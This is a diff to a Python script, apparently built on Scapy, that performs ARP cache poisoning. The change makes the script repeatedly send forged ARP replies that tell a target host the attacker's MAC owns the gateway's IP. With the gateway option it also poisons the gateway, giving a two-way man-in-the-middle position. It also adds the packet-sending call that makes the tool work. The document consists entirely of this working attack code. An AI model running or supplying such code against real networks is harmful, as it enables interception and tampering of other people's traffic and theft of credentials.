@@ -26,15 +26,16 @@ def main():
 	if not gw:
 		gw = False
 	
-
+	gw_ip = get_gw_ip(iface)
 	while True:
-		send_ARP_response(iface, src, target, gw)
+		send_ARP_response(iface, src, target, gw, gw_ip)
 		sleep(delay)
 
-def send_ARP_response(iface, src, target, gw):
-	if not gw:
-		gw_ip = get_gw_ip(iface)
-		send_is_at(iface, target, src, gw_ip)
+def send_ARP_response(iface, src, target, gw, gw_ip):
+	send_is_at(iface, target, src, gw_ip)
+	if gw:
+		send_is_at(iface, gw_ip, src, target)
+
 
 # TODO: get real gw address
 def get_gw_ip(iface):
@@ -42,12 +43,13 @@ def get_gw_ip(iface):
 
 def send_is_at(iface, target, src, ip):
 	dst_mac = get_mac_by_ip(target)
-	packet = Ether(dst=dst_mac, src=src) / ARP(op=ARP.is_at, hwsrc=src, psrc=ip, hwdst=dst_mac, pdst=target)
+	packet = Ether(dst=dst_mac, src=src) / ARP(op=2, hwsrc=src, psrc=ip, hwdst=dst_mac, pdst=target)
+	sendp(packet)
 
 def get_mac_by_ip(dst_ip):
 	my_ip = get_if_addr(conf.iface)
-	response = sr(ARP(op=1, psrc=my_ip, pdst=dst_ip))
-	return response[0][ARP].hwsrc
+	response = sr(ARP(op=1, psrc=my_ip, pdst=dst_ip), timeout=5)
+	return response[0][ARP][0][1].hwsrc
 
 if __name__ == "__main__":
 	main()
